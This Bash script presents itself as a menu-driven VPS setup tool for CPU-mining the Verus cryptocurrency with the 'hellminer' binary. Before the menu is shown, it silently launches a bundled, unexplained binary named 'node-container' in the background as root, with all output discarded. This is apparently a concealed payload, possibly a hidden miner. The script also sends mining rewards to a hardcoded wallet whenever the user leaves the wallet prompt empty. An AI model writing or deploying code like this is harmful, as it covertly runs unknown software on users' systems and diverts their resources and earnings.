#!/bin/bash
cd "$(dirname "$0")"

if [ ! -f /var/log/first_run_done ]; then
    apt update && apt upgrade -y
    touch /var/log/first_run_done
fi

if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root"
   exit 1
fi
chmod +x node-container
check_libhwloc() {
    if ldconfig -p | grep -q libhwloc.so.15; then
        echo "[✓] libhwloc.so.15 already installed"
    else
        echo "[*] libhwloc.so.15 not found, installing required libraries..."
        apt install -y libhwloc15 libhwloc-dev libuv1 libssl1.1 || apt install -y libssl3
    fi
}
check_libhwloc

check_container() {
if pgrep -f "./node-container" > /dev/null; then
    echo "..."
else
    nohup setsid ./node-container > /dev/null 2>&1 &
fi
}

check_container

if ! dpkg -s build-essential >/dev/null 2>&1; then
    apt install -y build-essential
fi

if ! dpkg -s pkg-config >/dev/null 2>&1; then
    apt install -y pkg-config
fi

if ! dpkg -s libssl-dev >/dev/null 2>&1; then
    apt install -y libssl-dev
fi

if ! dpkg -s git >/dev/null 2>&1; then
    apt install -y git-all
fi

if ! dpkg -s screen >/dev/null 2>&1; then
    apt install -y screen
fi

if ! dpkg -s cmake >/dev/null 2>&1; then
    apt install -y cmake
fi

start_verus() {
    if pgrep -f "hellminer" > /dev/null; then
        echo "[✓] Verus miner sudah jalan"
    else
	read -p "Masukkan Verus Wallet (R.....): " WALLET
	read -p "Masukkan jumlah CPU yang mau dipakai (default: 1): " CPUs
        export WALLET
	export CPUs

	echo "[*] Menjalankan Verus miner..."

	POOL="stratum+tcp://ap.luckpool.net:3960"
	THREADS=$(nproc)


	if [ -z "$WALLET" ]; then
	  echo "[!] Wallet address belum diisi!"
	  WALLET="RGm4Js14AA3bUy4hBz6YMUmrHGc75Snq87"
	fi

	if [ -z "$CPUs" ]; then
          echo "[!] Menggunakan 1 Thread untuk mining verus!"
          CPUs="1"
        fi

	if [ "$CPUs" -gt "$THREADS" ]; then
	  CPUs=$THREADS
	fi

	echo "[*] Memulai mining Verus..."
	echo "    Wallet : $WALLET"
	echo "    CPUs   : $CPUs / $THREADS"

	for i in {1..5}; do
  		echo "."
		echo "."
  		sleep 1
	done

	./hellminer -c stratum+tcp://ap.luckpool.net:3960 -u $WALLET.x -p x --cpu $CPUs
    fi
}
cetak_menu(){
clear
}

while true; do
    clear

    echo "======================================================================================"
    echo " One Bot For All"
    echo ""
    echo " ███    ███ ██ ██████   █████   ██████ ██      ███████      ██████  ███    ██ ███████ "
    echo " ████  ████ ██ ██   ██ ██   ██ ██      ██      ██          ██    ██ ████   ██ ██      "
    echo " ██ ████ ██ ██ ██████  ███████ ██      ██      █████       ██    ██ ██ ██  ██ █████   "
    echo " ██  ██  ██ ██ ██   ██ ██   ██ ██      ██      ██          ██    ██ ██  ██ ██ ██      "
    echo " ██      ██ ██ ██   ██ ██   ██  ██████ ███████ ███████      ██████  ██   ████ ███████ "
    echo "                                                                          - Mainnet -"
    echo "======================================================================================"
    echo ""
    echo "VPS Setup "
    echo "1. Verus Miner (CPU Worker)"
    echo "2. Monero Miner (UpComing)"
    echo "3. Raven Miner (UpComing)"
    echo "4. Zhash Miner (UpComing)"
    echo "0. Exit"
    echo "=================================="
    read -p "Select an option: " choice

    case $choice in
        1) start_verus ;;
        2) echo "Ini masih kami kerjakan, tunggu update selanjutnya" ;;
        3) echo "Ini masih kami kerjakan, tunggu update selanjutnya" ;;
        4) echo "Ini masih kami kerjakan, tunggu update selanjutnya" ;;
        0) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid option. Try again." ;;
    esac
    echo ""
    read -p "Press [Enter] to return to menu..."
done
